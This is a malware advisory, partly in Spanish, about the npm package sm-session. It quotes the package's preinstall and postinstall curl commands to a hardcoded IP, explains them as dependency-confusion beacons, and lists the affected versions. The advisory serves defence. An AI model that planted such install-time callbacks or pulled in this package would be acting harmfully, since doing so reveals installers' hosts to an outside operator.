# Aviso: Malicious code in sm-session (npm) (GHSA-wm74-4gpw-8fm5)

## Resumen

## Source: amazon-inspector (ef638f6aa70fe3af65e927efad452743a47f30a2aead95446181742704d9bd24)
package.json declares preinstall and postinstall lifecycle scripts that each run `curl -s http://16.192.173.5/sm-session/pre` and `curl -s http://16.192.173.5/sm-session/post` on `npm install`. The destination is a hardcoded bare IPv4 over plain HTTP with path segments identifying the package name and lifecycle stage, so every install signals the installer's host (source IP, user-agent, timing) to an operator-controlled endpoint. The behavior is the canonical dependency-confusion reconnaissance shape: a name-squat package whose only install-time action is a callback identifying which environments resolve the name. No legitimate package purpose is served by a plain-HTTP beacon to a bare IP in both pre- and postinstall hooks.

## Source: ossf-package-analysis (dc10328735ea596affb97ec9cd39bb62b49ed2017e4a11c0c27b1db7839aa405)
The OpenSSF Package Analysis project identified 'sm-session' @ 99.0.1 (npm) as malicious.

It is considered malicious because:

- The package executes one or more commands associated with malicious behavior.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/69cf85db3ebafc0534169441a15154ec56e73b2b/osv/malicious/npm/sm-session/MAL-2026-14400.json))

## Paquetes afectados

- `sm-session` (npm), versiones afectadas: = 99.0.1
- `sm-session` (npm), versiones afectadas: = 99.0.0

## Datos del aviso

- Tipo de aviso: malware
- Severidad: critical
- Publicado: 2026-08-24T06:30:33Z
- Fuente: https://github.com/advisories/GHSA-wm74-4gpw-8fm5

## Patrón a vigilar

Diff que añade (o fija por primera vez) una dependencia sobre cualquiera de los paquetes listados arriba, en cualquier versión del rango afectado -- el paquete en sí ES el malware, no hace falta ningún otro cambio sospechoso en el diff para que el riesgo sea máximo.
